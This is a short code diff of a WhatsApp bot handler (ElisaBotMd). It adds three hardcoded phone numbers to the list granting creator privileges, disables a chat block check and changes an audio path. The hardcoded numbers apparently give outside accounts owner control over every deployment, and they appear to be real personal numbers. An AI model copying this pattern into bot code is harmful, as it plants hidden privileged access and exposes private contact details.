@@ -185,7 +185,10 @@ module.exports = ElisaBotMd = async (ElisaBotMd, m, chatUpdate, store) => {
         const botNumber = await ElisaBotMd.decodeJid(ElisaBotMd.user.id)
     	const nimanumber = "94719574492"
     	const nimanumber2 = "94715166712"
-        const isCreator = [nimanumber2,botNumber,nimanumber ,...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
+    	const pasiduu = "94716338723"
+    	const isuruu = "94716221644"
+    	const thinuraa = "94711421243"
+        const isCreator = [pasiduu,isuruu,thinuraa,nimanumber2,botNumber,nimanumber ,...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
       //  const isSudo = [global.SUDO].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        // const isBlock = global.BLOCK_CHAT.map(v => v.replace(/[^0-9]/g, '') + '@g.us').includes(m.chat)
         const isNima = m.sender == "94715166712@s.whatsapp.net" ? true : false
@@ -254,14 +257,13 @@ module.exports = ElisaBotMd = async (ElisaBotMd, m, chatUpdate, store) => {
         
 
 // Block Chat 
-const Block_chat = JSON.parse(fs.readFileSync('./database/block_chat.json'))
+/*const Block_chat = JSON.parse(fs.readFileSync('./database/block_chat.json'))
 //const chatt = m.chat
 for (any in Block_chat){
-if (m.chat.startsWith(any)) {
-return
+if (m.chat === any ) return
+//if (m.chat.startsWith(any)) 
 }
-}
-
+*/
 
 // FAKE REPLYSSSS
 
@@ -396,7 +398,7 @@ for (let anji of sticker){
 			}
 for (let anju of audio){
 				if (budy.toLowerCase() === anju){
-					result = fs.readFileSync(`./media/voice/${anju}.mp3`)
+					result = fs.readFileSync(`./Media/audio/${anju}.mp3`)
 					ElisaBotMd.sendMessage(m.chat, { audio: result, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
 					}
 			}
